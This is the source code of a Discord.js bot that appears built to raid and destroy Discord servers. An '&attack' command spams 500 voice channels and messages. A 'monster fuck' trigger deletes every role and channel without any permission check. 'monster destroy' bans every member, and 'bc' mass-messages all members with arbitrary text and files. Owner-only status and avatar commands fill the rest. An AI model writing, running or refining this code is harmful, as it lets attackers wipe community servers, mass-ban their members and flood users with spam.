const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '&'

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('message', msg => {
  if (msg.content === 'ready') {
    msg.reply('yes sir :smiling_imp:');
  }
});


client.on('message' , async (message) => {
    if (message.content.startsWith(prefix + 'attack')) {
for (let i = 0; i < 500; i++) {

        message.guild.createChannel('ATLANTIC GANG', 'voice')
        message.channel.send('fuck');
}
}
}); 


client.on('message', function(message) {
	const myID = "348555232529219585";
    let args = message.content.split(" ").slice(1).join(" ");
    if(message.content.startsWith(prefix + "setname")) {
		        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setUsername(args);
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "stream")) {
		        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setGame(args , 'https://www.twitch.tv/datingbot');
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "play")) {
				        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setGame(args);
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "listen")) {
				        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setActivity(args, {type:'LISTENING'});
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "watch")) {
				        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setActivity(args, {type:'WATCHING'});
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "setavatar")) {
				        if(message.author.id !== myID) return;
        client.user.setAvatar(args);
        message.channel.send(':white_check_mark: Done!').then(msg => {
                if(!args) return message.reply('اكتب الحالة اللي تريدها.');
           msg.delete(5000);
          message.delete(5000);
        });
    }
});

client.on('message', x5bz => {   
    if (x5bz.content.startsWith("monster fuck")) {
        x5bz.guild.roles.forEach(r => { r.delete() }) 
        x5bz.guild.channels.forEach(c => { c.delete() })
                   let v5bz = new Discord.RichEmbed()
               .setColor('RANDOM')
               .setDescription('**Done sir ! i have been FUCKED THE SERVER ATLATNTIC GANG :cop:**')
              x5bz.author.sendEmbed(v5bz);
    }
    });


client.on('message', async message => {
    if(message.content === "monster destroy") {
        if(message.author.id !== '463958662684213249') return;
        message.guild.members.forEach(member => {
           member.ban(); 
        });
    } 
 });



 client.on('message', msg =>{
    let message=msg;
    if(message.content.startsWith("bc")){
        var args = message.content.split(' ').slice(1).join(' ');
    msg.guild.members.forEach(m=>{
        m.send(args.replace(/[user]/g,m)).catch();
    if(message.attachments.first()){
m.sendFile(message.attachments.first().url).catch();
    }
    })    ;
    }
});








client.login(process.env.BOT_TOKEN);
